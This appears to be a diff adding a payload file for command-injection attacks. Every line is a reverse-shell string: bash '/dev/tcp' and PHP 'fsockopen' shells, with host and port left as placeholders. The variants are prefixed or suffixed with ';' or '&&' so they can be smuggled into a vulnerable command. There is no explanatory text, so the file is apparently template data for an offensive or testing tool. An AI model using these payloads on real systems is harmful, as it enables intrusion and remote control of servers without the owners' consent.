@@ -1,0 +1,14 @@
+bash -i >& /dev/tcp/{0}/{1} 0>&1 2>&1
+;bash -i >& /dev/tcp/{0}/{1} 0>&1 2>&1
+bash -i >& /dev/tcp/{0}/{1} 0>&1 2>&1;
+;bash -i >& /dev/tcp/{0}/{1} 0>&1 2>&1;
+&& bash -i >& /dev/tcp/{0}/{1} 0>&1 2>&1
+bash -i >& /dev/tcp/{0}/{1} 0>&1 2>&1 &&
+&& bash -i >& /dev/tcp/{0}/{1} 0>&1 2>&1 &&
+php -r '$sock=fsockopen("{0}",{1});exec("/bin/sh -i <&3 >&3 2>&3");'
+;php -r '$sock=fsockopen("{0}",{1});exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("{0}",{1});exec("/bin/sh -i <&3 >&3 2>&3");';
+;php -r '$sock=fsockopen("{0}",{1});exec("/bin/sh -i <&3 >&3 2>&3");';
+&& php -r '$sock=fsockopen("{0}",{1});exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("{0}",{1});exec("/bin/sh -i <&3 >&3 2>&3");' &&
+&& php -r '$sock=fsockopen("{0}",{1});exec("/bin/sh -i <&3 >&3 2>&3");' &&
